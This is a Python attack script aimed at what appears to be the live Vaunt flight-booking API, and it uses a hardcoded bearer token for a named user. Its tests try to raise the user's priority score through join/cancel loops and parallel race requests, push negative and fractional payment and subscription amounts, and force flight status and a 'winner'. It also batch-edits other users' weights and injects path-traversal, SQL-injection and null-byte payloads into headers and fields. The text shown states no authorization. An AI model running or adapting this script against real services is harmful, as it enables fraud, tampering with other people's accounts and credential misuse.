#!/usr/bin/env python3
"""
COMPREHENSIVE BUSINESS LOGIC EXPLOIT TESTING
============================================

Tests all potential business logic flaws in Vaunt flight booking system:
- Race conditions
- Mathematical errors (negative, overflow, underflow)
- State transition flaws
- Timing issues
- Edge cases

User: Sameer (ID: 20254)
"""

import requests
import json
import time
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

# Results tracking
results = {
    'total_tests': 0,
    'vulnerable': 0,
    'secure': 0,
    'errors': 0,
    'findings': []
}

def log_result(test_name, status, details, cvss=0.0, severity="INFO"):
    """Log test result"""
    results['total_tests'] += 1

    if status == "VULNERABLE":
        results['vulnerable'] += 1
        results['findings'].append({
            'test': test_name,
            'status': status,
            'details': details,
            'cvss': cvss,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        })
        print(f"üö® VULNERABLE: {test_name}")
        print(f"   {details}")
        if cvss > 0:
            print(f"   CVSS: {cvss} ({severity})")
    elif status == "SECURE":
        results['secure'] += 1
        print(f"‚úÖ SECURE: {test_name}")
    elif status == "ERROR":
        results['errors'] += 1
        print(f"‚ö†Ô∏è ERROR: {test_name}")
        print(f"   {details}")
    else:
        print(f"‚ÑπÔ∏è {test_name}: {details}")

    print()

def make_request(method, endpoint, data=None, headers=None, timeout=10):
    """Make HTTP request with proper error handling"""
    if headers is None:
        headers = {
            "Authorization": f"Bearer {SAMEER_TOKEN}",
            "Content-Type": "application/json"
        }

    url = f"{API_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=timeout)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=timeout)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=timeout)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=timeout)
        elif method == "DELETE":
            r = requests.delete(url, headers=headers, timeout=timeout)
        else:
            return {"status": "error", "error": f"Unknown method: {method}"}

        return {
            "status": r.status_code,
            "data": r.json() if r.text and r.status_code != 204 else None,
            "text": r.text,
            "headers": dict(r.headers)
        }
    except requests.exceptions.Timeout:
        return {"status": "timeout", "error": "Request timeout"}
    except requests.exceptions.RequestException as e:
        return {"status": "error", "error": str(e)}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def get_user_info():
    """Get current user information"""
    result = make_request("GET", "/v1/user")
    if result['status'] == 200:
        return result['data']
    return None

def get_available_flight():
    """Get an available flight for testing"""
    result = make_request("GET", "/v3/flight?includeExpired=false&nearMe=false")
    if result['status'] == 200:
        data = result['data']
        if isinstance(data, dict) and 'data' in data:
            flights = data['data']
        else:
            flights = data

        if flights and len(flights) > 0:
            return flights[0]['id']
    return None

def get_current_flights():
    """Get current flights user is on"""
    result = make_request("GET", "/v2/flight/current")
    if result['status'] == 200:
        return result['data']
    return []

# ============================================================================
# TEST 1: DOUBLE JOIN EXPLOIT
# ============================================================================

def test_double_join():
    """Test if joining same flight twice gives priority boost"""
    print("="*80)
    print("TEST 1: DOUBLE JOIN EXPLOIT")
    print("="*80)
    print()

    # Get baseline
    baseline = get_user_info()
    if not baseline:
        log_result("Double Join", "ERROR", "Could not get baseline user info")
        return

    baseline_score = baseline.get('priorityScore')

    # Get flight
    flight_id = get_available_flight()
    if not flight_id:
        log_result("Double Join", "ERROR", "No available flights")
        return

    print(f"Testing with Flight {flight_id}")
    print(f"Baseline Priority Score: {baseline_score}")

    # Join once
    result1 = make_request("POST", f"/v2/flight/{flight_id}/enter", {})
    print(f"First join: Status {result1['status']}")

    time.sleep(0.5)

    # Join again immediately
    result2 = make_request("POST", f"/v2/flight/{flight_id}/enter", {})
    print(f"Second join: Status {result2['status']}")

    time.sleep(0.5)

    # Check score
    after = get_user_info()
    after_score = after.get('priorityScore')

    print(f"After Priority Score: {after_score}")

    # Cleanup
    make_request("POST", f"/v2/flight/{flight_id}/reset", {})

    # Analyze
    if after_score != baseline_score:
        log_result(
            "Double Join Exploit",
            "VULNERABLE",
            f"Priority score changed from {baseline_score} to {after_score} by joining twice. Potential priority manipulation.",
            cvss=6.5,
            severity="MEDIUM"
        )
    elif result2['status'] == 200:
        log_result(
            "Double Join Exploit",
            "VULNERABLE",
            "System allowed joining same flight twice without error. Could lead to state inconsistencies.",
            cvss=5.0,
            severity="LOW"
        )
    else:
        log_result(
            "Double Join Exploit",
            "SECURE",
            "Second join rejected or no priority manipulation possible"
        )

# ============================================================================
# TEST 2: JOIN-CANCEL-REJOIN LOOP
# ============================================================================

def test_join_cancel_loop():
    """Test rapid join/cancel cycles for priority manipulation"""
    print("="*80)
    print("TEST 2: JOIN-CANCEL-REJOIN LOOP")
    print("="*80)
    print()

    baseline = get_user_info()
    if not baseline:
        log_result("Join-Cancel Loop", "ERROR", "Could not get baseline")
        return

    baseline_score = baseline.get('priorityScore')

    flight_id = get_available_flight()
    if not flight_id:
        log_result("Join-Cancel Loop", "ERROR", "No available flights")
        return

    print(f"Testing with Flight {flight_id}")
    print(f"Baseline Priority Score: {baseline_score}")
    print(f"Running 10 join/cancel cycles...")

    scores = [baseline_score]

    for i in range(10):
        # Join
        r1 = make_request("POST", f"/v2/flight/{flight_id}/enter", {})
        time.sleep(0.1)

        # Cancel
        r2 = make_request("POST", f"/v2/flight/{flight_id}/reset", {})
        time.sleep(0.1)

        # Check score
        user = get_user_info()
        if user:
            score = user.get('priorityScore')
            scores.append(score)
            print(f"  Cycle {i+1}: Score = {score}")

    print(f"\nScore changes: {len(set(scores))} unique values")
    print(f"Scores: {scores[:5]}...")  # Show first 5

    if len(set(scores)) > 1:
        log_result(
            "Join-Cancel Loop",
            "VULNERABLE",
            f"Priority score changed during join/cancel cycles. Started at {baseline_score}, saw {len(set(scores))} different values. Potential manipulation vector.",
            cvss=7.0,
            severity="HIGH"
        )
    else:
        log_result(
            "Join-Cancel Loop",
            "SECURE",
            "Priority score remained constant through join/cancel cycles"
        )

# ============================================================================
# TEST 3: RACE CONDITION - PARALLEL BOOKINGS
# ============================================================================

def test_race_condition_parallel():
    """Test parallel simultaneous join requests"""
    print("="*80)
    print("TEST 3: RACE CONDITION - PARALLEL BOOKINGS")
    print("="*80)
    print()

    flight_id = get_available_flight()
    if not flight_id:
        log_result("Race Condition", "ERROR", "No available flights")
        return

    print(f"Testing with Flight {flight_id}")
    print(f"Sending 10 simultaneous join requests...")

    def join_flight():
        return make_request("POST", f"/v2/flight/{flight_id}/enter", {})

    # Send parallel requests
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(join_flight) for _ in range(10)]
        results_list = [f.result() for f in as_completed(futures)]

    success_count = sum(1 for r in results_list if r['status'] == 200)

    print(f"\nSuccessful joins: {success_count}/10")

    # Check current state
    time.sleep(1)
    current_flights = get_current_flights()
    on_flight = any(f.get('id') == flight_id for f in current_flights)

    # Cleanup
    make_request("POST", f"/v2/flight/{flight_id}/reset", {})

    if success_count > 1:
        log_result(
            "Race Condition - Parallel Joins",
            "VULNERABLE",
            f"System accepted {success_count} simultaneous join requests for same flight. Race condition vulnerability - could lead to duplicate entries or state corruption.",
            cvss=7.5,
            severity="HIGH"
        )
    else:
        log_result(
            "Race Condition - Parallel Joins",
            "SECURE",
            "Only one join request succeeded, proper race condition handling"
        )

# ============================================================================
# TEST 4: NEGATIVE AMOUNT EXPLOITS
# ============================================================================

def test_negative_amounts():
    """Test negative values in various fields"""
    print("="*80)
    print("TEST 4: NEGATIVE AMOUNT EXPLOITS")
    print("="*80)
    print()

    baseline = get_user_info()
    original_weight = baseline.get('weight')
    original_score = baseline.get('priorityScore')

    tests = [
        ("Negative Weight", "PATCH", "/v1/user", {"weight": -100}),
        ("Negative Priority Score", "PATCH", "/v1/user", {"priorityScore": -999999999}),
        ("Negative Payment", "POST", "/v1/payment", {"amount": -50}),
        ("Negative Refund", "POST", "/v1/refund", {"amount": -100}),
        ("Zero Weight", "PATCH", "/v1/user", {"weight": 0}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name}")
        result = make_request(method, endpoint, data)

        if result['status'] == 200:
            print(f"  ‚ö†Ô∏è Request accepted! Status 200")

            # Verify if it actually changed
            time.sleep(0.5)
            current = get_user_info()

            if 'weight' in data and current.get('weight') == data['weight']:
                vulnerabilities.append(f"{test_name}: Weight set to {data['weight']}")
                print(f"  üö® VULNERABLE: Weight changed to {current.get('weight')}")
            elif 'priorityScore' in data and current.get('priorityScore') == data['priorityScore']:
                vulnerabilities.append(f"{test_name}: Priority score set to {data['priorityScore']}")
                print(f"  üö® VULNERABLE: Priority score changed to {current.get('priorityScore')}")
            else:
                print(f"  ‚úì Value not actually changed")
        elif result['status'] == 400 or result['status'] == 422:
            print(f"  ‚úì Rejected with validation error (Status {result['status']})")
        elif result['status'] == 404:
            print(f"  - Endpoint not found")
        else:
            print(f"  Status: {result['status']}")

        print()

    # Restore original values
    if original_weight:
        make_request("PATCH", "/v1/user", {"weight": original_weight})

    if vulnerabilities:
        log_result(
            "Negative Amount Exploits",
            "VULNERABLE",
            f"Found {len(vulnerabilities)} negative value vulnerabilities: " + "; ".join(vulnerabilities),
            cvss=8.0,
            severity="HIGH"
        )
    else:
        log_result(
            "Negative Amount Exploits",
            "SECURE",
            "All negative value attempts properly validated"
        )

# ============================================================================
# TEST 5: INTEGER OVERFLOW/UNDERFLOW
# ============================================================================

def test_integer_overflow():
    """Test integer overflow conditions"""
    print("="*80)
    print("TEST 5: INTEGER OVERFLOW/UNDERFLOW")
    print("="*80)
    print()

    baseline = get_user_info()

    tests = [
        ("Max Int32 Priority", "PATCH", "/v1/user", {"priorityScore": 2147483647}),
        ("Max Int32 + 1", "PATCH", "/v1/user", {"priorityScore": 2147483648}),
        ("Max Int64", "PATCH", "/v1/user", {"priorityScore": 9223372036854775807}),
        ("Huge Priority Score", "PATCH", "/v1/user", {"priorityScore": 9999999999999999999}),
        ("Max Weight", "PATCH", "/v1/user", {"weight": 2147483647}),
        ("Huge Weight", "PATCH", "/v1/user", {"weight": 999999999}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name} - Value: {list(data.values())[0]}")
        result = make_request(method, endpoint, data)

        if result['status'] == 200:
            time.sleep(0.5)
            current = get_user_info()

            for key, val in data.items():
                if current.get(key) == val or current.get(key) < 0:
                    vulnerabilities.append(f"{test_name}: {key} = {current.get(key)}")
                    print(f"  üö® VULNERABLE: {key} set to {current.get(key)}")
                    break
            else:
                print(f"  ‚úì Value capped or rejected")
        else:
            print(f"  ‚úì Rejected (Status {result['status']})")

        print()

    # Restore
    if baseline.get('priorityScore'):
        make_request("PATCH", "/v1/user", {"priorityScore": baseline.get('priorityScore')})
    if baseline.get('weight'):
        make_request("PATCH", "/v1/user", {"weight": baseline.get('weight')})

    if vulnerabilities:
        log_result(
            "Integer Overflow/Underflow",
            "VULNERABLE",
            f"Found {len(vulnerabilities)} overflow vulnerabilities: " + "; ".join(vulnerabilities),
            cvss=7.0,
            severity="HIGH"
        )
    else:
        log_result(
            "Integer Overflow/Underflow",
            "SECURE",
            "Proper bounds checking on integer values"
        )

# ============================================================================
# TEST 6: DECIMAL/ROUNDING ERRORS
# ============================================================================

def test_decimal_rounding():
    """Test decimal rounding issues in payments"""
    print("="*80)
    print("TEST 6: DECIMAL/ROUNDING ERRORS")
    print("="*80)
    print()

    tests = [
        ("Tiny amount $0.001", "POST", "/v1/payment", {"amount": 0.001}),
        ("Rounds to zero $0.004", "POST", "/v1/payment", {"amount": 0.004}),
        ("Decimal rounding $9.999", "POST", "/v1/payment", {"amount": 9.999}),
        ("Many decimals $10.123456789", "POST", "/v1/payment", {"amount": 10.123456789}),
        ("Subscription $0.01", "POST", "/v1/subscription/purchase", {"plan": "cabin_plus", "amount": 0.01}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name}")
        result = make_request(method, endpoint, data)

        if result['status'] == 200:
            print(f"  ‚ö†Ô∏è Payment accepted! Status 200")
            print(f"  Response: {str(result['data'])[:200]}")
            vulnerabilities.append(test_name)
        elif result['status'] == 400 or result['status'] == 422:
            print(f"  ‚úì Validation error (Status {result['status']})")
        elif result['status'] == 404:
            print(f"  - Endpoint not found")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log_result(
            "Decimal/Rounding Errors",
            "VULNERABLE",
            f"Payment system accepted unusual decimal amounts: " + ", ".join(vulnerabilities),
            cvss=6.0,
            severity="MEDIUM"
        )
    else:
        log_result(
            "Decimal/Rounding Errors",
            "SECURE",
            "Proper decimal validation and rounding"
        )

# ============================================================================
# TEST 7: TIMEZONE MANIPULATION
# ============================================================================

def test_timezone_manipulation():
    """Test timezone-based exploits"""
    print("="*80)
    print("TEST 7: TIMEZONE MANIPULATION")
    print("="*80)
    print()

    flight_id = get_available_flight()
    if not flight_id:
        log_result("Timezone Manipulation", "ERROR", "No available flights")
        return

    timezones = [
        "UTC-12",
        "UTC+14",
        "America/New_York",
        "Invalid/Timezone",
        "../../etc/passwd",  # Path traversal
    ]

    vulnerabilities = []

    for tz in timezones:
        print(f"Testing timezone: {tz}")

        headers = {
            "Authorization": f"Bearer {SAMEER_TOKEN}",
            "Content-Type": "application/json",
            "Timezone": tz,
            "X-Timezone": tz,
        }

        result = make_request("POST", f"/v2/flight/{flight_id}/enter", {}, headers=headers)

        if result['status'] == 200:
            print(f"  ‚ö†Ô∏è Join succeeded with timezone: {tz}")
            vulnerabilities.append(tz)
            make_request("POST", f"/v2/flight/{flight_id}/reset", {})
        else:
            print(f"  Status: {result['status']}")

        print()

    # Test booking flights in the past
    print("Testing past date booking...")
    past_date = (datetime.now() - timedelta(days=365)).isoformat()
    result = make_request("POST", "/v1/flight/book", {"date": past_date, "flightId": flight_id})

    if result['status'] == 200:
        vulnerabilities.append("Past date booking")
        print(f"  üö® Booked flight with past date!")

    if vulnerabilities:
        log_result(
            "Timezone Manipulation",
            "VULNERABLE",
            f"Timezone handling issues found: " + ", ".join(vulnerabilities),
            cvss=5.5,
            severity="MEDIUM"
        )
    else:
        log_result(
            "Timezone Manipulation",
            "SECURE",
            "Proper timezone handling"
        )

# ============================================================================
# TEST 8: PAGINATION BYPASS
# ============================================================================

def test_pagination_bypass():
    """Test pagination limits for DoS or data enumeration"""
    print("="*80)
    print("TEST 8: PAGINATION BYPASS")
    print("="*80)
    print()

    endpoints = [
        "/v1/flight/current?limit=999999999",
        "/v3/flight?limit=999999999",
        "/v1/users?limit=999999999",
        "/v1/flights?offset=0&limit=999999999",
        "/v1/history?limit=-1",
    ]

    vulnerabilities = []

    for endpoint in endpoints:
        print(f"Testing: {endpoint}")
        start_time = time.time()
        result = make_request("GET", endpoint)
        elapsed = time.time() - start_time

        if result['status'] == 200:
            data_size = len(str(result['data']))
            print(f"  ‚ö†Ô∏è Returned data! Size: {data_size} bytes, Time: {elapsed:.2f}s")

            if data_size > 100000 or elapsed > 5:
                vulnerabilities.append(f"{endpoint}: {data_size} bytes in {elapsed:.2f}s")
                print(f"  üö® Potential DoS or data leak!")
        elif result['status'] == 'timeout':
            vulnerabilities.append(f"{endpoint}: Caused timeout")
            print(f"  üö® Request timed out - possible DoS vector")
        else:
            print(f"  ‚úì Rejected or limited (Status {result['status']})")

        print()

    if vulnerabilities:
        log_result(
            "Pagination Bypass",
            "VULNERABLE",
            f"Pagination vulnerabilities found: " + "; ".join(vulnerabilities),
            cvss=6.5,
            severity="MEDIUM"
        )
    else:
        log_result(
            "Pagination Bypass",
            "SECURE",
            "Proper pagination limits enforced"
        )

# ============================================================================
# TEST 9: DATE VALIDATION BYPASS
# ============================================================================

def test_date_validation():
    """Test invalid date handling"""
    print("="*80)
    print("TEST 9: DATE VALIDATION BYPASS")
    print("="*80)
    print()

    flight_id = get_available_flight()

    invalid_dates = [
        ("Invalid month", "2025-13-01"),
        ("Invalid day", "2025-12-45"),
        ("Far past", "1900-01-01"),
        ("Far future", "9999-12-31"),
        ("SQL injection", "' OR '1'='1"),
        ("Null byte", "2025-01-01\x00admin"),
        ("Format confusion", "01/13/2025"),
        ("Negative year", "-2025-01-01"),
    ]

    vulnerabilities = []

    for test_name, date_val in invalid_dates:
        print(f"Testing: {test_name} - {date_val}")

        result = make_request("POST", "/v1/flight/book", {
            "flightId": flight_id,
            "date": date_val
        })

        if result['status'] == 200:
            print(f"  üö® VULNERABLE: Accepted invalid date!")
            vulnerabilities.append(test_name)
        elif result['status'] in [400, 422]:
            print(f"  ‚úì Rejected with validation error")
        elif result['status'] == 500:
            print(f"  ‚ö†Ô∏è Server error - possible crash")
            vulnerabilities.append(f"{test_name} (caused 500)")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log_result(
            "Date Validation Bypass",
            "VULNERABLE",
            f"Date validation issues: " + ", ".join(vulnerabilities),
            cvss=5.0,
            severity="MEDIUM"
        )
    else:
        log_result(
            "Date Validation Bypass",
            "SECURE",
            "Proper date validation"
        )

# ============================================================================
# TEST 10: STATE TRANSITION EXPLOITS
# ============================================================================

def test_state_transitions():
    """Test invalid state transitions"""
    print("="*80)
    print("TEST 10: STATE TRANSITION EXPLOITS")
    print("="*80)
    print()

    flight_id = get_available_flight()
    if not flight_id:
        log_result("State Transitions", "ERROR", "No available flights")
        return

    # Try to force invalid transitions
    tests = [
        ("Force status CLOSED", "PATCH", f"/v1/flight/{flight_id}", {"status": "CLOSED"}),
        ("Force status OPEN", "PATCH", f"/v1/flight/{flight_id}", {"status": "OPEN"}),
        ("Force status CANCELLED", "PATCH", f"/v1/flight/{flight_id}", {"status": "CANCELLED"}),
        ("Set winner prematurely", "PATCH", f"/v1/flight/{flight_id}", {"winner": USER_ID, "status": "CLOSED"}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name}")
        result = make_request(method, endpoint, data)

        if result['status'] == 200:
            print(f"  üö® VULNERABLE: State change accepted!")
            vulnerabilities.append(test_name)
        elif result['status'] in [403, 401]:
            print(f"  ‚úì Forbidden (proper authorization)")
        elif result['status'] == 404:
            print(f"  - Endpoint not found")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log_result(
            "State Transition Exploits",
            "VULNERABLE",
            f"Invalid state transitions allowed: " + ", ".join(vulnerabilities),
            cvss=7.5,
            severity="HIGH"
        )
    else:
        log_result(
            "State Transition Exploits",
            "SECURE",
            "Proper state transition controls"
        )

# ============================================================================
# TEST 11: IDEMPOTENCY KEY ABUSE
# ============================================================================

def test_idempotency_abuse():
    """Test idempotency key reuse"""
    print("="*80)
    print("TEST 11: IDEMPOTENCY KEY ABUSE")
    print("="*80)
    print()

    flight_id = get_available_flight()
    if not flight_id:
        log_result("Idempotency Abuse", "ERROR", "No available flights")
        return

    # Use same idempotency key for multiple requests
    idempotency_key = "test-key-12345"

    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json",
        "Idempotency-Key": idempotency_key,
        "X-Idempotency-Key": idempotency_key,
    }

    print(f"Sending 3 requests with same idempotency key: {idempotency_key}")

    results_list = []
    for i in range(3):
        result = make_request("POST", f"/v2/flight/{flight_id}/enter", {}, headers=headers)
        results_list.append(result['status'])
        print(f"  Request {i+1}: Status {result['status']}")
        time.sleep(0.5)

    # Cleanup
    make_request("POST", f"/v2/flight/{flight_id}/reset", {})

    success_count = sum(1 for s in results_list if s == 200)

    if success_count > 1:
        log_result(
            "Idempotency Key Abuse",
            "VULNERABLE",
            f"Idempotency key reused - {success_count}/3 requests succeeded. Could allow duplicate operations.",
            cvss=6.0,
            severity="MEDIUM"
        )
    else:
        log_result(
            "Idempotency Key Abuse",
            "SECURE",
            "Proper idempotency handling (or no idempotency used)"
        )

# ============================================================================
# TEST 12: SUBSCRIPTION STATE EXPLOITS
# ============================================================================

def test_subscription_exploits():
    """Test subscription-related business logic"""
    print("="*80)
    print("TEST 12: SUBSCRIPTION STATE EXPLOITS")
    print("="*80)
    print()

    baseline = get_user_info()
    current_membership = baseline.get('currentMembership')

    print(f"Current membership: {current_membership}")

    # Try to upgrade/downgrade with invalid data
    tests = [
        ("Downgrade with negative price", "POST", "/v1/subscription/downgrade", {"refundAmount": -100}),
        ("Free Cabin+ upgrade", "POST", "/v1/subscription/upgrade", {"plan": "cabin_plus", "amount": 0}),
        ("Expired subscription use", "POST", "/v1/subscription/activate", {"expiryDate": "2020-01-01"}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name}")
        result = make_request(method, endpoint, data)

        if result['status'] == 200:
            print(f"  üö® VULNERABLE: Request succeeded!")
            vulnerabilities.append(test_name)
        elif result['status'] in [400, 422]:
            print(f"  ‚úì Validation error")
        elif result['status'] == 404:
            print(f"  - Endpoint not found")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log_result(
            "Subscription State Exploits",
            "VULNERABLE",
            f"Subscription vulnerabilities: " + ", ".join(vulnerabilities),
            cvss=7.0,
            severity="HIGH"
        )
    else:
        log_result(
            "Subscription State Exploits",
            "SECURE",
            "Proper subscription state management"
        )

# ============================================================================
# TEST 13: BULK OPERATION BYPASS
# ============================================================================

def test_bulk_operations():
    """Test bulk operation limits"""
    print("="*80)
    print("TEST 13: BULK OPERATION BYPASS")
    print("="*80)
    print()

    # Try bulk operations with many items
    tests = [
        ("Bulk join 1000 flights", "POST", "/v1/flights/bulk-enter", {"flightIds": list(range(1, 1001))}),
        ("Bulk cancel", "POST", "/v1/flights/bulk-cancel", {"flightIds": list(range(1, 101))}),
        ("Batch update", "PATCH", "/v1/users/batch", {"updates": [{"id": i, "weight": 200} for i in range(1, 101)]}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name}")
        start_time = time.time()
        result = make_request(method, endpoint, data, timeout=30)
        elapsed = time.time() - start_time

        if result['status'] == 200:
            print(f"  üö® VULNERABLE: Bulk operation succeeded in {elapsed:.2f}s")
            vulnerabilities.append(f"{test_name} ({elapsed:.2f}s)")
        elif result['status'] == 'timeout':
            print(f"  ‚ö†Ô∏è Request timed out - possible DoS")
            vulnerabilities.append(f"{test_name} (timeout)")
        elif result['status'] == 413:
            print(f"  ‚úì Payload too large")
        elif result['status'] == 404:
            print(f"  - Endpoint not found")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log_result(
            "Bulk Operation Bypass",
            "VULNERABLE",
            f"Bulk operation issues: " + "; ".join(vulnerabilities),
            cvss=5.5,
            severity="MEDIUM"
        )
    else:
        log_result(
            "Bulk Operation Bypass",
            "SECURE",
            "Proper bulk operation limits"
        )

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    print("="*80)
    print("VAUNT BUSINESS LOGIC EXPLOIT TESTING")
    print("="*80)
    print(f"Target: {API_URL}")
    print(f"User: {USER_ID}")
    print(f"Timestamp: {datetime.now().isoformat()}")
    print("="*80)
    print()

    # Get baseline info
    print("Getting baseline user information...")
    baseline = get_user_info()
    if baseline:
        print(f"‚úÖ User: {baseline.get('firstName', 'Unknown')}")
        print(f"   Priority Score: {baseline.get('priorityScore')}")
        print(f"   Membership: {baseline.get('currentMembership')}")
        print(f"   Weight: {baseline.get('weight')}")
    else:
        print("‚ùå Could not fetch user info")
        return

    print()
    print("="*80)
    print("BEGINNING TESTS")
    print("="*80)
    print()

    # Run all tests
    test_double_join()
    test_join_cancel_loop()
    test_race_condition_parallel()
    test_negative_amounts()
    test_integer_overflow()
    test_decimal_rounding()
    test_timezone_manipulation()
    test_pagination_bypass()
    test_date_validation()
    test_state_transitions()
    test_idempotency_abuse()
    test_subscription_exploits()
    test_bulk_operations()

    # Summary
    print("="*80)
    print("TESTING COMPLETE - SUMMARY")
    print("="*80)
    print()
    print(f"Total Tests: {results['total_tests']}")
    print(f"Vulnerable: {results['vulnerable']} üö®")
    print(f"Secure: {results['secure']} ‚úÖ")
    print(f"Errors: {results['errors']} ‚ö†Ô∏è")
    print()

    if results['vulnerable'] > 0:
        print("="*80)
        print("VULNERABILITIES FOUND")
        print("="*80)
        print()

        for finding in results['findings']:
            print(f"üö® {finding['test']}")
            print(f"   Severity: {finding['severity']} (CVSS {finding['cvss']})")
            print(f"   Details: {finding['details']}")
            print()

    # Write results to file
    output_file = "/home/user/vaunt/BUSINESS_LOGIC_EXPLOITS_RESULTS.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"Full results written to: {output_file}")
    print()

    return results

if __name__ == "__main__":
    try:
        results = main()
        sys.exit(0 if results['vulnerable'] == 0 else 1)
    except KeyboardInterrupt:
        print("\n\nTesting interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n\nFatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
